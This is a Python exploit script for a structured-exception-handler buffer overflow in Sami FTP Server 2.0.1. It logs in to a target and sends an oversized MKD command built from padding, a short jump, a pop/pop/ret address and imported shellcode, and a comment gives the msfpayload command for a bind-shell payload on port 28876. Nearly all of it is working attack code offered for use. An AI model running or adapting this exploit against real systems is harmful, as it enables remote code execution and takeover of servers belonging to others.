#!/usr/bin/python

# Exploit Title: Sami FTP MKD buffer overflow (SEH) + Bypass ASL
# Date: 11 Agosto 2013
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows 7 Home Basic x86, Spanish
# Thanks:To my wife for putting up with my possessions
#       
# Description: 
# A buffer overflow is triggered when a long MKD command is sent to the server and the user views the Log tab.
 
import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):


	target = target_machine
	port = target_port

	#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
	

	# SEH overwritten at offset 468
	# pop\pop\ret ESP at C:\Program Files\PMSystem\Temp\tmp0.dll (Universal)
	# pop/pop/ret 10022689

	jmpshort = b'\xeb\x06\x90\x90'
	nexseh= b'\x89\x26\x02\x10'
	garbage= b'\x41' * 468
	fixstack= b'\x81\xc4\x48\xf4\xff\xff'

	buffer = garbage + jmpshort + nexseh + fixstack + buf

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		s.connect((target,port))
		s.recv(1024)
		s.send(b'USER polunchis\r\n') 
		s.recv(1024)
		s.send(b'PASS polunchis\r\n')
		s.recv(1024)
		s.send(b"MKD " + buffer + b"\r\n")	
	except:
		print("Not Connected")
		